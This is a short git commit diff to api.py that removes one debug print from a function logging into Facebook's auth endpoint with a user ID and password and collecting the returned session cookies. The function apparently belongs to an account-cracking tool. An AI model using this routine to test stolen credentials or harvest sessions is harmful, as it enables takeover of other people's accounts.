4400b73169891bb68af413290ddbe892548e2da5
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2024-11-18 20:01:50 +0530

    Update api.py

--- api.py
+++ api.py
@@ -1586,7 +1586,6 @@ def x(uid,pwx,tl):
             'Content-Length': '847'}
             url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
-            print(result)
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
